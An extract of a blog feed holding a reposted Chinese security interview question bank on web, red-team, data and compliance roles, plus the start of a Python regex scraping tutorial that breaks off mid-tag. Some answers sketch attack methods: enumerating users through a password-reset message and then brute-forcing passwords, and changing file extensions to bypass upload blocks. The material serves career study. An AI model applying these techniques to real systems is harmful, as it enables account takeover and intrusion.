2017</p><blockquote><p>1）注入；</p><p>2）失效的身份认证；</p><p>3）敏感信息泄露；</p><p>4）XML外部实体（XXE）；</p><p>5）失效的访问控制；</p><p>6）安全配置错误；</p><p>7）跨站脚本（XSS）；</p><p>8）不安全的反序列化；</p><p>9）使用含有已知漏洞的组件；</p><p>10）不足的日志记录和监控。</p></blockquote><p>8、说出至少三种业务逻辑漏洞，以及修复方式？</p><blockquote><p>密码找回漏洞中存在密码允许暴力破解、存在通用型找回凭证、可以跳过验证步骤、找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码；</p><p>身份认证漏洞中最常见的是会话固定攻击和Cookie仿冒，只要得到Session或Cookie即可伪造用户身份；</p><p>验证码漏洞中存在验证码允许暴力破解、验证码可以通过Javascript或者改包的方法来进行绕过。 </p></blockquote><p>9、目标站无防护，上传图片可以正常访问，上传脚本格式访问则403，什么原因？</p><blockquote><p>原因很多，有可能Web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p></blockquote><p>10、目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</p><blockquote><p>先爆破用户名，再利用被爆破出来的用户名爆破密码；</p><p>其实有些站点，在登陆处也会这样提示；</p><p>所有和数据库有交互的地方都有可能有注入</p></blockquote><blockquote><p>转载自作者：薯角 <a href="https://www.bilibili.com/read/cv9886414">https://www.bilibili.com/read/cv9886414</a> 出处：bilibili， 仅供自己学习使用</p></blockquote><h4 id="应用安全岗位-Web方向"><a href="#应用安全岗位-Web方向" class="headerlink" title="应用安全岗位-Web方向"></a>应用安全岗位-Web方向</h4><ul><li><p>漏洞利用修复基础。挑选两到四个不同方向常见和不常见的漏洞，就漏洞原理、利用方式和修复方案进行提问，然后根据回答的情况进行详细深入的二次提问</p><ul><li><p>Redis未授权访问漏洞如何入侵利用？</p></li><li><p>SSRF漏洞原理、利用方式及修复方案？Java和PHP的SSRF区别？</p></li><li><p>宽字节注入漏洞原理、利用方式及修复方案？</p></li><li><p>简述JSONP的业务意义，JSONP劫持利用方式及修复方案？如何设计落地一个CSRF Token？</p></li><li><p>CORS原理、利用及修复？</p></li><li><p>CRLF注入原理？</p></li><li><p>URL白名单如何绕过？</p></li><li><p>XSS持久化如何实现？</p></li><li><p>Fastjson常见漏洞原理？如何彻底解决Fastjson漏洞？</p></li><li><p>TLS1.2协议交互过程以及攻击方法？</p></li></ul></li><li><p>渗透全流程</p><ul><li><p>信息收集部分</p><ul><li>域名爆破中，泛域名解析问题如何解决？</li></ul></li></ul></li><li><p>漏洞检测方式</p><ul><li><p>可以从哪些阶段、层次去检测漏洞？其优劣势是什么？</p></li><li><p>越权问题如何检测？</p></li><li><p>白盒不适合检测哪些类型漏洞？</p></li><li><p>黑盒如何检测XSS漏洞？</p></li><li><p>如何爬取更全的请求？</p></li><li><p>黑盒带登录态扫描如何规避业务影响？</p></li><li><p>如何识别代码中后门？</p></li></ul></li><li><p>安全评估</p><ul><li><p>安全评估到底要评什么东西？</p></li><li><p>某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？</p></li><li><p>新应用如何评估安全风险？</p></li><li><p>需求阶段、系分阶段安全评估的侧重点是什么？</p></li><li><p>接口B的参数是从接口A的响应中获取的，会存在什么风险？</p></li><li><p>Docker容器以及K8s有哪些风险？</p></li><li><p>IPv6和IPv4安全差异？</p></li><li><p>三方引入的应用和自研应用评估差异有哪些？</p></li><li><p>金融业务有何特色？</p></li><li><p>mvn源的安全性需要考虑哪些点？</p></li><li><p>如何让业务方主动找你评估？</p></li><li><p>如何判断评估覆盖范围的优先级？</p></li><li><p>如何降低各人检验导致评估不一致？</p></li><li><p>如何系统提高安全评估效率？</p></li><li><p>安全评估和人工测试以及自动化测试三者差异是什么？</p></li><li><p>算法模型的安全风险如何评估？</p></li><li><p>区块链安全风险主要有哪些？</p></li><li><p>如何理解安全左移？</p></li><li><p>安全评估的行业最佳实践是什么？</p></li><li><p>如何看待未来安全评估的趋势？</p></li></ul></li><li><p>安全方案</p><ul><li><p>如何规避绕口令带来的风险？</p></li><li><p>硬编码密钥如何系统解决？</p></li><li><p>0day漏洞如何防御</p></li><li><p>GitHub等三方泄漏敏感信息如何体系防御</p></li><li><p>业务逻辑漏洞如何通过技术手段避免写出来？</p></li><li><p>软件供应链后门和漏洞如何系统规避</p></li></ul></li><li><p>移动安全</p><ul><li><p>App自检升级场景下会存在哪些风险？</p></li><li><p>如何设计一套通信机制，能够保证传输过程中的完整性、不可抵赖性以及防止重放？</p></li><li><p>如何进行实体检测？</p></li><li><p>常见的调试方法和检测方法？</p></li><li><p>如何防止Frida、Xposed等注入攻击？</p></li><li><p>如何防止当前设备的数据拷贝到其他设备？</p></li><li><p>外挂有几种类型的实现方式？</p></li><li><p>如何避免未经用户授权获取权限？</p></li></ul></li><li><p>风险处置</p><ul><li><p>漏洞修复一般分为哪几个步骤？</p></li><li><p>如何制定漏洞的修复时间？需要考虑哪些因素？</p></li><li><p>如何系统性让提升漏洞修复效率？</p></li><li><p>漏洞修复完成后需要做什么事情？</p></li><li><p>外部厂商漏洞如何快速有效推进修复？</p></li></ul></li><li><p>应急响应</p><ul><li><p>有哪几种后门实现方式？</p></li><li><p>webshell检测有什么方法思路？</p></li><li><p>Linux服务器中了木马后，请简述应急思路？</p></li><li><p>遇到新0day(比如Struts2)后，应该如何进行应急响应？</p></li><li><p>新业务上线前可以从哪些方向进行安全评估？</p></li><li><p>现有系统可以从哪些方向进行审计发现其中的安全风险？</p></li><li><p>公司突然爆发大规模数据泄露导致的诈骗事件，如何应急？</p></li></ul><h4 id="网络主机岗位"><a href="#网络主机岗位" class="headerlink" title="网络主机岗位"></a>网络主机岗位</h4></li><li><p>主机最重要的基线是什么？</p></li><li><p>禁止出网的价值有哪些？</p></li><li><p>如何对网络区域进行划分？</p></li><li><p>云原生下的网络和主机差异是什么？会有哪些新的风险？</p></li><li><p>如何解决员工被钓鱼问题？</p></li><li><p>如何解决员工通过电脑或手机外发公司敏感文件？</p></li><li><p>经典网络与VPC的优劣势</p></li><li><p>如何实现反向HTTPS代理</p></li><li><p>DDoS/CC如何有效防御与应急？</p></li><li><p>如何通过技术手段避免非预期端口开放？</p></li><li><p>容器存在哪些特有安全风险？</p></li><li><p>运维白屏化的难点是什么？</p></li></ul><h4 id="威胁感知岗位-数据分析"><a href="#威胁感知岗位-数据分析" class="headerlink" title="威胁感知岗位-数据分析"></a>威胁感知岗位-数据分析</h4><ul><li>如何在加密流量中检测出恶意流量？</li><li>常见的C&amp;C通道种类和检测方法？</li><li>主机有哪些日志对安全有哪些帮助？</li><li>如何实现URL的去重？</li><li>如何识别公共和私有接口？</li><li>如何识别机器行为请求？</li><li>如何识别异常服务器外联？</li><li>如何感知越权风险？</li><li>如何识别攻击请求是定点攻击还是随机扫描？</li><li>如何识别钓鱼网站？</li><li>基于网络五元组可以做到哪些风险行为的分析？</li><li>未感知部分如何衡量？</li><li>威胁感知可以在哪些层面进行？</li><li>感知规则的有效性如何系统验证？</li><li>国内和国外攻击特点有什么区别？</li><li>专家检验无法覆盖的风险如何检测？</li></ul><h4 id="数据安全岗位"><a href="#数据安全岗位" class="headerlink" title="数据安全岗位"></a>数据安全岗位</h4><ul><li><p>安全责任与意识</p><ul><li>如何系统性提升员工安全意识？</li><li>如何做到针对性的安全意识提升？</li><li>如何衡量员工安全意识？</li><li>什么是安全责任制？如何落地安全责任制？</li></ul></li><li><p>数据采集使用</p><ul><li>数字水印的类型和应用领域？</li><li>隐藏水印有哪些实现方式？</li><li>如何对无显著特征的数据进行分类分级？</li><li>如何避免员工因非工作需要查询用户数据？</li><li>如何避免未经用户授权收集用户数据？</li><li>如何避免用户数据被超范围使用？</li><li>何时应该进行用户数据销毁？</li><li>更换机房时如何清除原机房机器数据？</li><li>如何让每一次后台查询数据都得到用户授权？or 如何收敛管理后台可查询任意敏感信息功能？</li><li>如何在不拿到明文数据的前提下，还能通过数据进行一些计算行为？如何实现合作伙伴原始数据不共享但能达成业务诉求？</li></ul></li><li><p>权限</p><ul><li>如何避免审批工单无脑通过？</li><li>高危害影响权限如何避免滥用？</li><li>如何技术手段规避未进行权限检查？</li><li>大数据平台的权限管控体系中最重要的是什么？</li></ul></li><li><p>加解密</p><ul><li><p>哪些Hash和加密算法不建议使用？</p></li><li><p>硬编码秘钥如何解决？</p></li><li><p>PKI原理</p></li><li><p>国密的底层原理？</p></li><li><p>密码如何保存在数据库？</p></li><li><p>如何让密码轮转？</p></li><li><p>内网传输是否需要加密？</p></li><li><p>可以在哪些层次对文件进行加密？</p></li><li><p>如何技术手段实现全站HTTPS</p></li></ul><h4 id="合规审计岗位"><a href="#合规审计岗位" class="headerlink" title="合规审计岗位"></a>合规审计岗位</h4><ul><li>国内外有哪些网络安全相关法律？</li><li>金融行业和传统互联网行业合规差异</li><li>对于内控、合规、审计的理解（考察其对于要做的事情和岗位要求、公司环境是否匹配，考察其大局上考虑是否周全或是片面）</li></ul><ul><li>传统行业和互联网行业的安全建设的区别及各自的优劣势（是否能准确的抓住核心原因）</li><li>信息安全等级保护、网络安全法、GDPR，挑选一到两个问其对其的来源理解以及落地程度取舍</li><li>数据安全治理可以用什么思路做？</li><li>如何通过技术手段实现对异常操作的自动化监控？</li><li>如何对一个应用进行安全评估？</li><li>如何对一个应用进行安全审计？</li><li>如何理解权限分离、最小化权限？</li><li>考察一些CISP、CISSP的知识点</li><li>挑选一些较为复杂的流程，比如转岗、离职等，如何设计考虑其中的细节</li></ul><h4 id="安全蓝军岗位"><a href="#安全蓝军岗位" class="headerlink" title="安全蓝军岗位"></a>安全蓝军岗位</h4><ul><li>安全蓝军和常规渗透测试的差异是什么？</li><li>蓝军如何体系建设？</li><li>各种常见木马的的优劣势？</li><li>木马免杀有哪些方式？哪种方式最有效？</li><li>木马隧道有哪些？哪种隧道在当前最有效？</li><li>Word DDE和Office宏有什么优劣势？</li><li>如何绕过Office受保护视图？</li><li>有哪些有效的钓鱼方式？</li><li>如何绕过WAF、HIDS、威胁感知，选其一回答？</li><li>BadUSB原理及局限？</li><li>Cobalt Strike</li><li>如何在禁止出网的机器上访问互联网？</li><li>ew、frp差异？</li><li>ICMP如何出网？</li><li>如何进行水坑攻击？</li><li>如何利用XSS让影响最大化？</li><li>如何全流程最大限度降低被红军发现概率？</li><li>如何在有限的人力下最大化突出蓝军价值？</li></ul><h4 id="安全管理岗位-安全架构方向"><a href="#安全管理岗位-安全架构方向" class="headerlink" title="安全管理岗位-安全架构方向"></a>安全管理岗位-安全架构方向</h4><ul><li>传统IDC、云上、混合云架构的安全差异和各自挑战是什么？</li><li>纯云业务如何设计安全架构？</li><li>SDL中的关键点是什么以及如何解决？</li><li>如何防止0day攻击？</li><li>渗透测试、安全研发、安全运营的问题可以挑选的问一些，以确保在各个方向上比较均衡</li><li>对于企业不同时期、不同阶段、不同体量的安全建设的方法、区别以及侧重</li><li>你所做过的安全架构图和所期望的安全架构</li><li>安全与其他团队（运维、研发、测试、GR/PR、内控、高管及三方安全公司）的关系</li><li>安全建设的理念/方法论理解，纵深防御、白名单和黑名单、规则经验和机器学习、自研或者外采</li><li>安全的衡量指标？衡量企业安全建设的水平？</li><li>不同公司间的安全区别或差别是什么？比如腾讯和阿里，百度和京东</li><li>如何制定公司安全建设的三年甚至五年计划</li><li>未来安全行业趋势？</li></ul><h4 id="安全开发岗位-Java方向"><a href="#安全开发岗位-Java方向" class="headerlink" title="安全开发岗位-Java方向"></a>安全开发岗位-Java方向</h4></li><li><p>Java基础</p><ul><li>Java虚拟机区域如何划分？</li><li>HashMap和HashTable、ConcurrentHashMap的区别？</li><li>进程和线程区别，进程间、线程间通信有哪几种方式？</li><li>Java BIO/NIO/AIO是什么？适用哪些场景？</li></ul></li><li><p>业务基础      </p><ul><li>调试工具及异常排查流程？<ul><li><p>如何最大限度避免故障？</p></li><li><p>数据库索引结构，什么情况下应该建唯一索引？</p></li><li><p>数据库分页语句如何写？</p></li></ul></li></ul></li><li><p>业务安全      </p><ul><li>HTTPS交互过程<ul><li><p>OAuth2.0交互过程及其中可能存在的配置不当安全风险</p></li><li><p>对称加密和非对称加密的区别及优缺点</p></li><li><p>获取一个入参url，请求url地址的内容时应注意什么？</p></li><li><p>参数入库前应该如何过滤？</p></li><li><p>过滤器和拦截器原理和应用场景？</p></li><li><p>SESSION ID如何不被Javascript读取？</p></li><li><p>CSRF的Token如何设计？</p></li><li><p>同源策略？如何实现跨域请求？</p></li></ul></li></ul></li></ul><h2 id="面试经验"><a href="#面试经验" class="headerlink" title="面试经验"></a>面试经验</h2><h4 id="企业考察点"><a href="#企业考察点" class="headerlink" title="企业考察点"></a>企业考察点</h4><ul><li>应聘者专业知识及技能，是否能胜任应聘岗位的要求？</li><li>应聘者的学习能力，是否能快速适应和学习？</li><li>应聘者价值观，是否与企业相匹配？</li><li>应聘者认知接受能力，是否能承认错误并改进？</li><li>应聘者创造的欲望，是否有激情？</li></ul><h4 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h4><ul><li><p>提前通过搜索引擎、朋友等渠道，尽可能了解所面试公司发展方向、业务模式、主要产品、公司文化、技术氛围、公开的文章、演讲、分享等信息。</p><ul><li>针对面试的岗位需求以及自己工作经历准备一份简单的自我介绍，方便面试官快速准确的了解你的优点和综合素质。要能顺畅的讲出来，同时避免流水账。</li><li> 面试官除了会看简历外，像GitHub、博客等可变内容应当提前整理维护下。</li></ul></li></ul><h4 id="面试结束"><a href="#面试结束" class="headerlink" title="面试结束"></a>面试结束</h4><ul><li>表示对面试官的感谢</li><li>作为面试者，及时记录在面试过程中的不足点，针对不足点进行强化，下一轮面试中改进（往往不足点也会被面试官记录下来并让下一个面试官留意考察）</li></ul><h4 id="甄别团队和同事"><a href="#甄别团队和同事" class="headerlink" title="甄别团队和同事"></a>甄别团队和同事</h4><ul><li>面试官时间管理经验判断，是否会提前预约面试时间、是否会准时参加面试、是否会控制面试过程避免面试者一直讲陷入细节从而超过常见面试时间等</li><li>面试官面试经验判断，根据提问可以了解到其是否有提前了解自己简历中的一些信息、是否问的都是一些很简单的问题、问的问题前后没有逻辑像是模板一样一个个事前准备好的、是否通过预言方式来问问题（你会怎么做？你将怎么做？）等</li><li>面试官基础素质判断，遇到自己回答不好的问题时面试官是否表现出不耐烦等负面情绪、面试官是否会无理打断自己、是否有审讯式的提问（往往通过咄咄逼人的方式提问，试图让面试者出现逻辑矛盾）、是否有质疑式提问（通过质疑、不相信的态度进行沟通，试图让面试者证明一切的真实性）、是否有打压式提问（一定要找到一些你不了解的方向但又问的特别多）、是否有高高在上（往往表现为轻蔑的语气）、是否能问出一些细节（而不只是夸夸其谈）。此处有个例外，资深的管理者往往有可能问一些低级问题，我们需要甄别面试官是真的基础素质不行还是非常资深但希望通过一些低级问题来反向考察面试者</li><li>面试官技术能力判断，这个判断的前提是你是该领域专家，否则很有可能出现的情况是，其实是你没有领会面试官意图而觉得人家不专业的误判。当你对该领域很资深时，你能根据面试官的问题很容易的判断出来其对这个领域的技术水平和认知，甚至一些时候可以通过反向询问（慎用）来支撑你的判断。此外还可以通过了解目标企业的安全水位来判断他们安全技术能力程度</li><li>面试官管理能力，这点非常重要，对于稍微高阶职位来讲，我们多数时候并不期望面试官中的管理者技术很强，更看重的是自己心底愿不愿意跟着他干，跟着他干是不是能有好的发展前途，是不是能有空间获得个人成长</li></ul><h2 id="笔试题目"><a href="#笔试题目" class="headerlink" title="笔试题目"></a>笔试题目</h2><h4 id="渗透测试-Web方向"><a href="#渗透测试-Web方向" class="headerlink" title="渗透测试-Web方向"></a>渗透测试-Web方向</h4><ul><li>给定一个漏洞靶场，在一定时间内找出最多漏洞数</li><li>给定一个匿名访问Redis，请GET SHELL</li><li>给一个项目场景进行安全评估（e.g.与三方厂商进行API交互）</li><li>给定一些包含漏洞（建议SSRF、反序列化、营销活动）的代码，使其发现漏洞或风险、利用漏洞、修复漏洞</li></ul><h4 id="软件开发方向"><a href="#软件开发方向" class="headerlink" title="软件开发方向"></a>软件开发方向</h4><ul><li>读取一个文件第100-200行并发送到一个指定的API接口（着重考察对于各种异常情况的考虑）</li><li>最快的方式获取100万个子域名请求的响应内容并找出其中真实存在的子域名</li></ul><blockquote><p>转载自 <a href="https://github.com/FeeiCN/SecurityInterviewGuide">https://github.com/FeeiCN/SecurityInterviewGuide</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-spider2</title>
      <link href="/2021/08/20/python-spider2/"/>
      <url>/2021/08/20/python-spider2/</url>
      
        <content type="html"><![CDATA[<p><code>re</code> 模块和Xpath解析HTML，处理防盗链，线程池，<code>aiohttp</code>异步爬取，m3u8抓取一部视频，<code>selenium</code>模块讲解</p><h2 id="re-模块"><a href="#re-模块" class="headerlink" title="re 模块"></a>re 模块</h2><p><code>.*</code> 贪婪匹配</p><p><code>.*?</code> 懒惰匹配</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'玩儿吃鸡游戏，晚上一起玩游戏，干嘛呢？打游戏啊'</span>r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'玩儿.*游戏'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>r2 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'玩儿.*?游戏'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>result1 <span class="token operator">=</span> r1<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span>result2 <span class="token operator">=</span> r2<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>output</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span><span class="token string">'玩儿吃鸡游戏，晚上一起玩游戏，干嘛呢？打游戏'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'玩儿吃鸡游戏'</span><span class="token punctuation">]</span>Process finished with <span class="token builtin class-name">exit</span> code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>贪婪匹配会尽可能多的匹配内容，而懒惰匹配则相反</p></blockquote><h5 id="关于re-S"><a href="#关于re-S" class="headerlink" title="关于re.S"></a>关于<code>re.S</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""sdfkhellolsdlfsdfiooefo:877898989worldafdsf"""</span>b <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'hello(.*?)world'</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>c <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'hello(.*?)world'</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'b is '</span> <span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'c is '</span> <span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>output</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">b is  <span class="token punctuation">[</span><span class="token punctuation">]</span>c is  <span class="token punctuation">[</span><span class="token string">'lsdlfsdfiooefo:\n877898989'</span><span class="token punctuation">]</span>Process finished with <span class="token builtin class-name">exit</span> code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始。</p><p>而使用re.S参数以后，正则表达式会将这个字符串作为一个整体，在整体中进行匹配。</p></blockquote><h5 id="以变量形式取出自己想要的内容"><a href="#以变量形式取出自己想要的内容" class="headerlink" title="以变量形式取出自己想要的内容"></a>以变量形式取出自己想要的内容</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;div class='jay'>&lt;span id='1'>jay&lt;/span>&lt;/div>&lt;div class='jj'>&lt;span id='2'>jj&lt;/span>&lt;/div>&lt;div class='joli'>&lt;span id='3'>joli&lt;/span>&lt;/div>&lt;div class='tom'>&lt;span id='4'>tom&lt;/span>&lt;/div>"""</span>r1 <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"&lt;div class='.*?'>&lt;span id='\d+'>(?P&lt;name>.*?)&lt;/span>&lt;/div>"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>result <span class="token operator">=</span> r1<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>output</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">jayjjjolitomProcess finished <span class="token keyword">with</span> exit code <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）"><a href="#豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）" class="headerlink" title="豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）"></a>豆瓣Top250提取电影名称，评分等（正则表达式解析HTML）</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ol</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>grid_view<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>item<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://movie.douban.com/subject/1292052/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>肖申克的救赎<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://img2.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://movie.douban.com/subject/1292052/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>肖申克的救赎<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>The Shawshank Redemption<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>other<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>月黑高飞(港)  /  刺激1995(台)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>playable<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>[可播放]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                            导演: 弗兰克·德拉邦特 Frank Darabont<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>主演: 蒂姆·罗宾斯 Tim Robbins /...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>                            1994<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>美国<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>/<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>犯罪 剧情                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>star<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rating5-t<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token 